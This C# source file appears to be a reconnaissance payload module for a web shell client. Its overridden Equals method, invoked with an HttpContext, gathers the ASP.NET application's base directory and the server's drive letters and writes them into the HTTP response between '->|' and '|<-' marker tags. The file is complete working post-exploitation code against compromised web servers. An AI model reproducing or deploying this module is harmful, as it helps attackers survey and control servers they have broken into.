﻿using System;
using System.IO;
using System.Web;

namespace BASE_Info
{
    public class Run
    {
        public HttpRequest Request;
        public HttpResponse Response;
        public String encoder;
        public String decoder;
        public String cs;
        public String randomPrefix;


        public override bool Equals(object obj)
        {
            this.parseObj(obj);
            this.cs = "UTF-8";
            this.encoder = "base64";
            this.decoder = "";
            this.randomPrefix = "2";
            String tag_s = "->|";
            String tag_e = "|<-";
            this.Response.Charset = cs;
            String result = "";
            try
            {
                if (this.Request.Form["version"] != null)
                {
                    String[] split = System.Text.Encoding.GetEncoding(cs)
                        .GetString(System.Convert.FromBase64String(this.Request.Form["version"])).Split(';');
                    if (split.Length == 1)
                    {
                        this.randomPrefix = split[0];
                    }
                    else
                    {
                        this.randomPrefix = split[0];
                        tag_s = split[1];
                        tag_e = split[2];
                    }
                }

                result += this.GetInfo();
            }
            catch (Exception e)
            {
                result = "ERROR:// " + e.Message;
            }

            this.Response.Write(tag_s + asoutput(result) + tag_e);
            return true;
        }

        public void parseObj(Object obj)
        {
            if (obj.GetType().IsArray)
            {
                Object[] data = (Object[])obj;
                this.Request = (HttpRequest)data[0];
                this.Response = (HttpResponse)data[1];
            }
            else
            {
                try
                {
                    HttpContext context = (HttpContext)obj;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
                catch (Exception)
                {
                    HttpContext context = HttpContext.Current;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
            }
        }

        public string GetInfo()
        {
            String ret = "";
            String[] c = Directory.GetLogicalDrives();
            ret = String.Format("{0}\t", AppDomain.CurrentDomain.BaseDirectory);
            for (int i = 0; i < c.Length; i++)
                ret += c[i][0] + ":";
            return ret;
        }

        public String asoutput(String src)
        {
            String ret;
            try
            {
                switch (decoder)
                {
                    case "base64":
                    {
                        ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                        break;
                    }
                    default:
                    {
                        ret = src;
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                ret = e.Message.ToString();
            }

            return ret;
        }
    }
}